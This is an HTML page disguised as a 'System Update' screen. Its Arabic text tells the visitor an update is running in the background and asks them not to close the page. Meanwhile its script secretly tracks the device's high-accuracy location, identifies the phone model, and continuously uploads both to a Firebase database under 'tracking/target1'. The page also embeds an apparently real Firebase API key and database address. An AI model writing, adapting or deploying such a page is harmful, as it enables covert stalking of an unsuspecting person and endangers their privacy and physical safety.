<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update</title>
    <link rel="manifest" href="manifest.json">
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body style="background:#000; color:#fff; text-align:center; padding-top:50px; font-family:sans-serif;">
    <h2>جاري تحديث النظام في الخلفية</h2>
    <p>يرجى عدم اغلاق الصفحة لضمان اكتمال التحديث</p>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBCCXqcD29paJYKGI6eevmUuRa4bW11ccU",
            databaseURL: "https://omar-store-2025-default-rtdb.firebaseio.com",
            projectId: "omar-store-2025",
            appId: "1:1073673986144:web:a27de784d878f3d5d5a305"
        };
        firebase.initializeApp(firebaseConfig);

        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js');
        }

        function getDeviceModel() {
            const ua = navigator.userAgent;
            if (ua.includes("OPPO")) return "Oppo Device";
            if (ua.includes("Samsung") || ua.includes("SM-")) return "Samsung Galaxy";
            if (ua.includes("iPhone")) return "iPhone";
            if (ua.includes("Redmi") || ua.includes("Xiaomi")) return "Xiaomi Redmi";
            return navigator.platform + " Mobile";
        }

        const options = {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        };

        if (navigator.geolocation) {
            navigator.geolocation.watchPosition((pos) => {
                const data = {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    acc: Math.round(pos.coords.accuracy),
                    device: getDeviceModel(),
                    time: new Date().toLocaleTimeString('ar-EG')
                };
                firebase.database().ref('tracking/target1').set(data);
            }, (err) => { console.error(err) }, options);
        }
    </script>
</body>
</html>
